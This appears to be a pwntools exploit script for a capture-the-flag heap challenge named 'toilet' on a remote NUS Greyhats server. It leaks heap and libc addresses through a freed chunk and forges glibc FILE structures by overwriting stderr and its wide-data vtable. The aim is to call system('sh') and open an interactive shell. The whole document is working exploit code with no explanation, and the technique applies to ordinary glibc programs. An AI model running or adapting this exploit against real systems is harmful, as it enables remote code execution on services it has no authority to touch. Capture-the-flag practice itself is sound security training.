from pwn import *

elf = ELF("./toilet_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("challs.nusgreyhats.org", 35127)

def malloc():
    p.sendlineafter(b'> ', b'2')

def free(index):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'\n', str(index).encode())

def read(index):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'\n', str(index).encode())
    p.recvuntil(b'at ')
    leak = int(p.recvuntil(b'!', drop=True), 16)
    p.recvuntil(b'was: ')

    return leak, p.recvuntil(b'What', drop=True)

def edit(index, offset, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'?\n', str(index).encode())
    p.sendlineafter(b'?\n', str(offset).encode())
    p.sendlineafter(b'\n', data)
    

malloc()
free(0)
heap_base, libc_base = read(0)
libc_base = u64(libc_base.ljust(8, b'\x00')) - 2112288
heap_base = heap_base - 672

print(hex(libc_base))
print(hex(heap_base))

malloc()
payload = FileStructure(null=0xdeadbeef)
payload._IO_write_base = 0
payload._IO_buf_base = 0
payload.vtable = libc.symbols['system'] + libc_base
payload = bytes(payload)
payload += pack(heap_base+1696 + 216-0x68)
payload += pack(libc.symbols['system'] + libc_base) 
payload = payload.ljust(0x400, b'a')
edit(1, 0x400, payload + pack(0x810) + pack(0x21) + b'a' * 0x20 + pack(0x800) + pack(libc_base + libc.symbols['_IO_2_1_stderr_']))
# gdb.attach(p)

a = FileStructure(null=heap_base)
print(a)
a.flags = u32(b"  sh")
a._IO_write_base = 0
a._IO_write_ptr = 1
a._wide_data = heap_base + 1696
a.vtable = libc.symbols['_IO_wfile_jumps'] + libc_base
print(bytes(a))
edit(1, 0, bytes(a))



p.interactive()
